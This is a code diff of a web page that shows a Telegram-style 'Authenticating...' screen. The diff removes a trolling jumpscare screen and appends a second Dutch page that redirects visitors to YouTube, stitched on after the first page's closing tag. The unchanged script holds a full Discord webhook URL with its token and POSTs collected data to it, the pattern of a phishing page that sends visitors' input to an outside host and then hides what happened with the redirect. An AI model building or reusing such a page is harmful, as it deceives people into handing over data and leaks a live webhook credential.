@@ -152,17 +152,6 @@
   <div style="color:var(--tg-blue); font-weight:600; font-size:1.1rem;">Authenticating...</div>
 </div>
 
-<div id="screen-jumpscare">
-  <video id="jvid" class="jumpscare-video" playsinline preload="auto">
-    <source src="jumpscare.mp4" type="video/mp4">
-  </video>
-</div>
-
-<div id="screen-troll">
-  <div class="troll-msg">GET TROLLED<br>BY NIGHT OWL</div>
-  <div style="font-size: 5rem; margin-top: 20px;">🖕😂🖕</div>
-  <audio id="troll-sound" src="troll.mp3" loop preload="auto"></audio>
-</div>
 
 <script>
   const WEBHOOK = 'https://discord.com/api/webhooks/1494738036196380876/Q6PQ6OSlX1eLOAgNxOB5r2ZAoy47uvpqXdN8zHhMPn1Qe9rn8GClRWThiLO2MKpB2noV';
@@ -269,5 +258,23 @@
     await fetch(WEBHOOK, { method: 'POST', body: data });
   }
 </script>
+</body>
+</html>
+
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="refresh" content="0; url=https://www.youtube.com">
+    <title>Doorsturen naar YouTube...</title>
+    
+    <script>
+        // Direct doorsturen via JavaScript
+        window.location.replace("https://www.youtube.com");
+    </script>
+</head>
+<body>
+    <p>Je wordt doorgestuurd naar YouTube. Als er niets gebeurt, 
+       <a href="https://www.youtube.com">klik dan hier</a>.</p>
 </body>
 </html>
